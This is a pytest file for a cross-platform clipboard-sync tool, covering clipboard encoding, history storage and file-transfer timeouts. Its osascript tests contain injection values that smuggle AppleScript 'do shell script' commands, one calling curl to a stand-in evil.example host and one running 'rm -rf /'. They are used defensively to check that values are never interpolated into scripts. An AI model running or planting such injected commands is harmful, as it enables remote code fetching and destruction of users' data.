"""Cross-platform clipboard simulation tests.

Simulates clipboard behavior for Windows, macOS, and Linux in-process,
verifying that the content format pipeline works correctly for each platform.
"""

import os
import struct
import subprocess
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ── Platform simulation helpers ──────────────────────────────────────────


class SimClipboard:
    """In-memory clipboard that simulates platform-specific behavior."""

    def __init__(self):
        self._content: dict[str, bytes] = {}
        self._change_count = 0

    def set_text(self, text: str):
        self._content["text"] = text.encode("utf-8")
        self._content["text.cf_unicodetext"] = text.encode("utf-16-le")
        self._change_count += 1

    def set_html(self, html: str):
        self._content["html"] = html.encode("utf-8")
        self._change_count += 1

    def set_rtf(self, rtf: str):
        self._content["rtf"] = rtf.encode("utf-8")
        self._change_count += 1

    def set_image(self, png_data: bytes):
        self._content["png"] = png_data
        self._change_count += 1

    def get_text(self) -> str | None:
        if "text" in self._content:
            return self._content["text"].decode("utf-8")
        if "text.cf_unicodetext" in self._content:
            return self._content["text.cf_unicodetext"].decode("utf-16-le").rstrip("\x00")
        return None

    def get_html(self) -> str | None:
        if "html" in self._content:
            return self._content["html"].decode("utf-8")
        return None

    def get_rtf(self) -> str | None:
        if "rtf" in self._content:
            return self._content["rtf"].decode("utf-8")
        return None

    def get_image_png(self) -> bytes | None:
        return self._content.get("png")

    def clear(self):
        self._content.clear()
        self._change_count += 1

    @property
    def change_count(self) -> int:
        return self._change_count


class TestWindowsClipboardSim:
    """Simulate Windows clipboard behavior — UTF-16-LE, CF_UNICODETEXT priority."""

    def test_text_encoding_roundtrip(self):
        """Windows uses UTF-16-LE with null terminators."""
        cb = SimClipboard()
        text = "Hello 世界 🌍"

        # Simulate Windows CF_UNICODETEXT write
        cb._content["text.cf_unicodetext"] = text.encode("utf-16-le") + b"\x00\x00"

        # Read back (simulating _read_text_handle with wide=True)
        raw = cb._content["text.cf_unicodetext"]
        decoded = raw.decode("utf-16-le").rstrip("\x00")
        assert decoded == text

    def test_cf_text_vs_cf_unicodetext_priority(self):
        """CF_UNICODETEXT should be preferred over CF_TEXT (ANSI)."""
        cb = SimClipboard()
        chinese = "你好世界"

        # Simulate both formats present (Windows reality)
        cb._content["text.cf_unicodetext"] = chinese.encode("utf-16-le")
        try:
            cb._content["text.cf_text"] = chinese.encode("gbk")  # ANSI/GBK
        except Exception:
            cb._content["text.cf_text"] = chinese.encode("utf-8")

        # Read: prefer UNICODE
        raw_unicode = cb._content["text.cf_unicodetext"]
        text = raw_unicode.decode("utf-16-le").rstrip("\x00")
        assert text == chinese

    def test_null_terminator_stripping(self):
        """Windows clip text has trailing null bytes that must be stripped.

        UTF-16-LE encodes each char as 2 bytes. The null terminator is
        U+0000 encoded as \\x00\\x00 (2 bytes). Must ensure even byte length.
        """
        cb = SimClipboard()
        # Windows clipboard: UTF-16-LE text + U+0000 null terminator (2 bytes)
        raw_utf16 = "ClipSync".encode("utf-16-le") + b"\x00\x00"
        assert len(raw_utf16) % 2 == 0  # must be even for valid UTF-16-LE
        cb._content["text.cf_unicodetext"] = raw_utf16

        # Strip null (U+0000) characters
        cleaned = raw_utf16.decode("utf-16-le").rstrip("\x00")
        assert cleaned == "ClipSync"
        assert "\x00" not in cleaned

    def test_image_dib_to_png(self):
        """Windows clipboard images are DIB format, must convert to PNG."""
        cb = SimClipboard()

        # Create a simulated DIB (1x1 pixel, 24-bit, blue)
        # BITMAPINFOHEADER: 40 bytes
        bi_size = 40
        bi_width = 1
        bi_height = 1
        bi_planes = 1
        bi_bit_count = 24
        bi_compression = 0
        bi_size_image = 4  # padded row
        dib_header = struct.pack(
            "<IiiHHIIiiII",
            bi_size,
            bi_width,
            bi_height,
            bi_planes,
            bi_bit_count,
            bi_compression,
            bi_size_image,
            0,
            0,
            0,
            0,
        )
        pixel_data = b"\xff\x00\x00\x00"  # BGR + padding = blue pixel
        dib = dib_header + pixel_data

        cb._content["dib"] = dib

        # Verify DIB can be wrapped as BMP
        bi_size_read = struct.unpack_from("<I", dib, 0)[0]
        assert bi_size_read == 40
        bi_bit_count_read = struct.unpack_from("<H", dib, 14)[0]
        assert bi_bit_count_read == 24


class TestMacOSClipboardSim:
    """Simulate macOS clipboard behavior — NSPasteboard polling, RTF, TIFF."""

    def test_polling_change_count(self):
        """macOS uses polling (400ms) with changeCount."""
        cb = SimClipboard()
        initial = cb.change_count
        cb.set_text("hello")
        assert cb.change_count == initial + 1
        cb.set_html("<b>bold</b>")
        assert cb.change_count == initial + 2

    def test_polling_no_missed_first(self):
        """First poll should detect content even if change_count starts non-zero."""
        cb = SimClipboard()
        cb.set_text("pre-existing content")
        # Even though we "start monitoring late", we should still read content
        assert cb.get_text() == "pre-existing content"

    def test_rtf_handling(self):
        """macOS supports RTF via NSAttributedString."""
        cb = SimClipboard()
        rtf_text = "{\\rtf1\\ansi\\deff0 Hello}"
        cb.set_rtf(rtf_text)
        assert cb.get_rtf() == rtf_text

    def test_multiple_formats_simultaneously(self):
        """macOS clipboard can have multiple representations at once."""
        cb = SimClipboard()
        cb.set_text("plain")
        cb.set_html("<p>rich</p>")
        cb.set_rtf("{\\rtf1 rich}")
        cb.set_image(b"\x89PNG\x00\x00\x00")

        assert cb.get_text() == "plain"
        assert cb.get_html() == "<p>rich</p>"
        assert cb.get_rtf() == "{\\rtf1 rich}"
        assert cb.get_image_png() == b"\x89PNG\x00\x00\x00"


class TestLinuxClipboardSim:
    """Simulate Linux clipboard behavior — xclip/wl-paste, Wayland vs X11."""

    def test_text_roundtrip(self):
        cb = SimClipboard()
        cb.set_text("Linux clipboard test")
        assert cb.get_text() == "Linux clipboard test"

    def test_unicode_preservation(self):
        """Linux clipboard should preserve full Unicode."""
        cb = SimClipboard()
        text = "Привет мир\n日本語\n🌟"
        cb.set_text(text)
        assert cb.get_text() == text

    def test_rtf_support(self):
        """Linux with xclip -t text/rtf supports RTF."""
        cb = SimClipboard()
        rtf = "{\\rtf1\\ansi Hello from Linux}"
        cb.set_rtf(rtf)
        assert cb.get_rtf() == rtf

    def test_wayland_wl_paste_format(self):
        """Wayland uses wl-paste which handles MIME types natively."""
        cb = SimClipboard()

        # Simulate what wl-paste --list-types would return
        cb.set_text("Wayland text")
        cb.set_html("<html>Wayland</html>")

        assert cb.get_text() == "Wayland text"
        assert cb.get_html() == "<html>Wayland</html>"


class TestCrossPlatformContentParity:
    """Verify that the same content is handled identically across platforms."""

    def test_text_encoding_normalization(self):
        """All platforms should produce the same UTF-8 output."""
        from internal.clipboard.format import ClipboardContent, ContentType

        # Simulate three platforms reading the same content
        content = "同一个世界 🌐"
        content_utf8 = content.encode("utf-8")

        # All platforms normalize to ClipboardContent with UTF-8 TEXT
        clip = ClipboardContent(types={ContentType.TEXT: content_utf8})
        assert clip.types[ContentType.TEXT] == content_utf8
        assert clip.types[ContentType.TEXT].decode("utf-8") == content

    def test_hash_key_platform_independent(self):
        """Content hash should be the same regardless of source platform."""
        from internal.clipboard.format import ClipboardContent, ContentType

        # Same logical content should hash the same
        c1 = ClipboardContent(
            types={
                ContentType.TEXT: b"text",
                ContentType.HTML: b"<p>html</p>",
            }
        )
        c2 = ClipboardContent(
            types={
                ContentType.HTML: b"<p>html</p>",
                ContentType.TEXT: b"text",
            }
        )
        assert c1.hash_key() == c2.hash_key()

    def test_format_priority_consistent(self):
        """HTML > RTF > TEXT > IMAGE_PNG priority is platform-independent."""
        from internal.clipboard.format import ClipboardContent, ContentType

        c = ClipboardContent(
            types={
                ContentType.IMAGE_PNG: b"img",
                ContentType.TEXT: b"txt",
                ContentType.RTF: b"rtf",
                ContentType.HTML: b"html",
            }
        )
        fmt, data = c.best_format()
        assert fmt == ContentType.HTML

        # Remove HTML → RTF wins (above TEXT and IMAGE_PNG)
        del c.types[ContentType.HTML]
        fmt, data = c.best_format()
        assert fmt == ContentType.RTF

        # Remove RTF → TEXT wins (above IMAGE_PNG)
        del c.types[ContentType.RTF]
        fmt, data = c.best_format()
        assert fmt == ContentType.TEXT

        # Remove TEXT → IMAGE_PNG last resort
        del c.types[ContentType.TEXT]
        fmt, data = c.best_format()
        assert fmt == ContentType.IMAGE_PNG


class TestPlatformAvailability:
    """Check whether platform-specific dependencies are available."""

    @pytest.mark.skipif(sys.platform != "linux", reason="Linux only")
    def test_xclip_available(self):
        result = subprocess.run(["which", "xclip"], capture_output=True)
        if result.returncode != 0:
            pytest.skip("xclip not installed")

    @pytest.mark.skipif(sys.platform != "linux", reason="Linux only")
    def test_wl_paste_available(self):
        result = subprocess.run(["which", "wl-paste"], capture_output=True)
        if result.returncode != 0:
            pytest.skip("wl-paste not installed (Wayland not available)")

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_pbpaste_available(self):
        result = subprocess.run(["which", "pbpaste"], capture_output=True)
        assert result.returncode == 0, "pbpaste should be available on macOS"

    @pytest.mark.skipif(sys.platform != "win32", reason="Windows only")
    def test_windows_clipboard_module_loads(self):
        """Ensure the Windows clipboard module can be imported."""
        import internal.clipboard.clipboard_windows  # noqa: F401


if __name__ == "__main__":
    pytest.main([__file__, "-v"])


# ══════════════════════════════════════════════════
# merged from test_clipboard_fixes.py
# ══════════════════════════════════════════════════

import os
import sqlite3
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from internal.clipboard import clipboard_darwin as darwin
from internal.clipboard.format import ClipboardContent, ContentType
from internal.clipboard.history_db import ClipboardHistoryDB

# ── #1 osascript argv passing (macOS write fallback) ──────────────────


class _RunCapture:
    """Stand-in for subprocess.run that records every command."""

    def __init__(self):
        self.commands = []

    def __call__(self, cmd, **kwargs):
        self.commands.append(cmd)
        return subprocess.CompletedProcess(cmd, 0)


@pytest.fixture
def run_capture(monkeypatch):
    cap = _RunCapture()
    monkeypatch.setattr(darwin.subprocess, "run", cap)
    return cap


EVIL_URL = '" & do shell script "curl http://evil.example/x" & "'


def test_osascript_argv_cmd_passes_values_as_arguments():
    cmd = darwin._osascript_argv_cmd("on run argv\nend run", 'a"b', "-flag")
    assert cmd[:3] == ["osascript", "-e", "on run argv\nend run"]  # static source
    assert cmd[3:] == [darwin._ARGV_MARK + 'a"b', darwin._ARGV_MARK + "-flag"]


def test_set_url_never_interpolates_url_into_script(run_capture):
    w = darwin._ClipboardWriter()
    w._set_url(EVIL_URL.encode("utf-8"))

    assert len(run_capture.commands) == 1
    cmd = run_capture.commands[0]
    script = cmd[2]
    # Payload must ride in argv, never appear in the AppleScript source.
    assert EVIL_URL not in script
    assert "do shell script" not in script
    assert script.startswith("on run argv")
    assert cmd[3].startswith(darwin._ARGV_MARK)
    assert cmd[3][1:] == EVIL_URL


def test_set_url_with_quotes_round_trips_via_argv(run_capture):
    w = darwin._ClipboardWriter()
    url = 'https://example.com/He said "hi".html'
    w._set_url(url.encode("utf-8"))

    cmd = run_capture.commands[0]
    assert cmd[3][1:] == url  # survives verbatim through argv
    assert url not in cmd[2]  # and is not in the source


def test_set_url_empty_value_is_a_noop(run_capture):
    w = darwin._ClipboardWriter()
    w._set_url(b"   \n")
    assert run_capture.commands == []


def test_set_files_never_interpolates_paths_into_script(run_capture):
    w = darwin._ClipboardWriter()
    paths = [
        '/Users/x/He said "hi".txt',
        "-dash-leading-name.txt",
        '"; do shell script "rm -rf /"; "',
        "/Users/x/正常 文件名.png",
    ]
    w._set_files("\n".join(paths).encode("utf-8"))

    assert len(run_capture.commands) == 1
    cmd = run_capture.commands[0]
    script = cmd[2]
    for p in paths:
        assert p not in script
    assert "do shell script" not in script
    assert script.startswith("on run argv")
    args = cmd[3:]
    assert [a[1:] for a in args] == paths  # marker-prefixed, order preserved


def test_set_files_empty_list_is_a_noop(run_capture):
    w = darwin._ClipboardWriter()
    w._set_files(b"\n \n")
    assert run_capture.commands == []


def test_write_atomic_invalid_utf8_file_data_falls_back(monkeypatch):
    # A FILE payload whose bytes are not valid UTF-8 (the 0xb8 opcode byte)
    # used to raise UnicodeDecodeError out of _write_atomic → HTTP 500 on
    # /api/paste-rich. It must fall back to the osascript _set_files path.
    monkeypatch.setattr(darwin, "_init_nspasteboard", lambda: (object(), object()))
    content = ClipboardContent(types={ContentType.FILE: b"bad-\xb8-name"})
    assert darwin._ClipboardWriter()._write_atomic(content) is False


# ── #2 image_fmt exposed through storage and web API ──────────────────


@pytest.fixture
def history_db(tmp_path):
    return ClipboardHistoryDB(
        storage_path=str(tmp_path / "history.db"),
        max_entries=50,
    )


def _bmp_entry(ts=1000.0):
    return ClipboardContent(
        types={ContentType.IMAGE_PNG: b"BM-fake-bmp-bytes"},
        timestamp=ts,
        image_fmt="bmp",
    )


def _text(body: str, ts: float) -> ClipboardContent:
    return ClipboardContent(
        types={ContentType.TEXT: body.encode("utf-8")},
        timestamp=ts,
    )


def test_image_fmt_survives_add_and_reload(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=50)
    db.add(_bmp_entry())
    assert db.get_all()[0]["image_fmt"] == "bmp"

    # A fresh instance (app restart) restores the hint from the DB row.
    db2 = ClipboardHistoryDB(storage_path=path, max_entries=50)
    assert db2.get_all()[0]["image_fmt"] == "bmp"


class _StubCfg:
    device_id = "dev-local"
    device_name = "Local"
    peers = {}
    web_history_limit = 20


def test_api_history_exposes_image_fmt(history_db):
    history_db.add(_bmp_entry())

    from internal.web.api.history import get_history, get_history_item

    payload, status = get_history(history_db, _StubCfg())
    assert status == 200
    item = payload["items"][0]
    assert item["content_type"] == "IMAGE"
    assert item["image_fmt"] == "bmp"

    detail, status = get_history_item(
        {"entry_id": [str(item["entry_id"])]},
        history_db,
        _StubCfg(),
    )
    assert status == 200
    assert detail["item"]["image_fmt"] == "bmp"
    assert detail["item"]["types"]["IMAGE"] == "Qk0tZmFrZS1ibXAtYnl0ZXM="


def _peer_cfg(peer_id="peer-9", peer_name="Phone"):
    from types import SimpleNamespace

    cfg = _StubCfg()
    cfg.peers = {
        peer_id: SimpleNamespace(device_id=peer_id, device_name=peer_name),
    }
    return cfg


def test_api_history_local_clip_source_is_local_device_name(history_db):
    """A clip captured on this machine carries an empty source_device; the API
    must surface the local device name (not 'unknown') in both the list and
    the detail view."""
    from internal.web.api.history import get_history, get_history_item

    cfg = _peer_cfg()
    history_db.add(_text("hello", 1001.0))  # local clip: empty sid

    payload, status = get_history(history_db, cfg)
    assert status == 200
    item = payload["items"][0]
    assert item["source_device"] == ""
    assert item["source_name"] == cfg.device_name  # "Local", not "unknown"

    detail, status = get_history_item({"entry_id": [str(item["entry_id"])]}, history_db, cfg)
    assert status == 200
    assert detail["item"]["source_name"] == cfg.device_name


def test_api_history_remote_clip_source_is_peer_name(history_db):
    """A clip received from a peer maps to the peer's display name."""
    from internal.web.api.history import get_history

    cfg = _peer_cfg()
    remote = _text("from phone", 1002.0)
    remote.source_device = "peer-9"
    history_db.add(remote)

    payload, status = get_history(history_db, cfg)
    assert status == 200
    item = payload["items"][0]
    assert item["source_device"] == "peer-9"
    assert item["source_name"] == "Phone"


def test_legacy_db_without_image_fmt_column_migrates(tmp_path):
    """A pre-image_fmt database must ALTER-add the column, not fail."""
    path = tmp_path / "old.db"
    conn = sqlite3.connect(str(path))
    conn.execute(
        "CREATE TABLE history ("
        " entry_id INTEGER PRIMARY KEY, timestamp REAL NOT NULL,"
        " content_type TEXT NOT NULL DEFAULT '',"
        " text_preview TEXT NOT NULL DEFAULT '',"
        " types TEXT NOT NULL DEFAULT '{}',"
        " source_device TEXT NOT NULL DEFAULT '',"
        " source_app TEXT NOT NULL DEFAULT '',"
        " source_title TEXT NOT NULL DEFAULT '',"
        " pinned INTEGER NOT NULL DEFAULT 0,"
        " paste_count INTEGER NOT NULL DEFAULT 0)"
    )
    conn.execute(
        "INSERT INTO history (entry_id, timestamp, content_type, text_preview, types)"
        " VALUES (1, 1000.0, 'IMAGE', '[Image]', '{}')"
    )
    conn.commit()
    conn.close()

    db = ClipboardHistoryDB(storage_path=str(path), max_entries=50)
    entry = db.get_all()[0]
    assert entry["text_preview"] == "[Image]"
    assert entry["image_fmt"] == ""  # unknown -> clients fall back to PNG


def test_mobile_html_selects_mime_from_image_fmt():
    """The phone page must map fmt->MIME instead of hardcoding image/png."""
    static_dir = Path(__file__).resolve().parent.parent / "internal" / "web" / "static"
    html = (static_dir / "mobile.html").read_text(encoding="utf-8")
    assert "image/bmp" in html
    assert "image/tiff" in html
    assert "imageDataUrl(item)" in html  # called with the full item


# ── #3 memory trim aligned with DB trim key ───────────────────────────


def test_memory_trim_matches_db_trim_under_clock_skew(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=3)

    # The DB stamps local receipt time (not the sender's clock), so these
    # wildly skewed `ts` values must NOT reorder or drive the trim.
    db.add(_text("X", ts=5000.0))  # arrives first
    db.add(_text("Y", ts=1000.0))
    db.add(_text("Z", ts=2000.0))
    assert len(db.get_all()) == 3

    db.add(_text("W", ts=1500.0))  # over limit -> trim one

    mem = {e["text_preview"] for e in db.get_all()}
    # Trim keeps the most recent ARRIVALS (W, Z, Y); the skewed timestamps
    # are ignored, so X — the oldest arrival — is the one dropped.
    assert mem == {"W", "Z", "Y"}

    conn = sqlite3.connect(path)
    rows = {r[0] for r in conn.execute("SELECT text_preview FROM history WHERE pinned = 0")}
    conn.close()
    assert rows == mem  # DB dropped exactly the same entry


def test_memory_trim_preserves_pinned_entries(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=3)
    db.add(_text("X", ts=5000.0))
    db.add(_text("Y", ts=1000.0))
    db.add(_text("Z", ts=2000.0))

    eid_y = next(e["entry_id"] for e in db.get_all() if e["text_preview"] == "Y")
    assert db.batch_set_pinned([eid_y], True) == 1

    db.add(_text("W", ts=1500.0))  # 4 entries, 1 pinned -> keep top-2 unpinned

    previews = {e["text_preview"] for e in db.get_all()}
    # Local-receipt stamping: the trim keeps pinned Y plus the two most
    # recent ARRIVALS (W, Z); X — the oldest arrival — is the one dropped.
    assert previews == {"W", "Y", "Z"}

    conn = sqlite3.connect(path)
    rows = {r[0] for r in conn.execute("SELECT text_preview FROM history")}
    conn.close()
    assert rows == previews


# ── #4 FILE_COMPLETE wait timeout reason ─────────────────────────────


class TestFileCompleteTimeoutReason:
    def test_completion_wait_timeout_reports_error_timeout(self, tmp_path, monkeypatch):
        from internal.sync import file_transfer as ft_mod
        from internal.sync.file_transfer import FileTransferManager

        monkeypatch.setattr(ft_mod, "COMPLETION_WAIT_TIMEOUT", 1.0)
        # The sender now waits out the receiver's full retransmit window
        # (COMPLETION_WAIT_TIMEOUT + MAX_RETRANSMIT_ROUNDS * RETRANSMIT_TIMEOUT),
        # so shrink RETRANSMIT_TIMEOUT too or the give-up never fires in time.
        monkeypatch.setattr(ft_mod, "RETRANSMIT_TIMEOUT", 0.2)

        mgr = FileTransferManager("test-device", str(tmp_path / "out"))
        completions = []
        mgr.set_on_transfer_complete(
            lambda tid, ok, cancelled, status: completions.append((tid, ok, cancelled, status)),
        )

        f = tmp_path / "hello.bin"
        f.write_bytes(b"x" * 100)
        frames = []
        tid = mgr.send_file(str(f), frames.append)
        mgr.handle_message("file_ack", {"transfer_id": tid}, frames.append)

        deadline = time.time() + 15
        while not completions and time.time() < deadline:
            time.sleep(0.1)

        assert completions, "transfer never completed"
        done_tid, ok, cancelled, status = completions[0]
        assert done_tid == tid
        assert ok is False
        assert cancelled is False
        # A wait timeout is not a dropped connection -- it must not be
        # reported as peer_offline.
        assert status == "error_timeout"
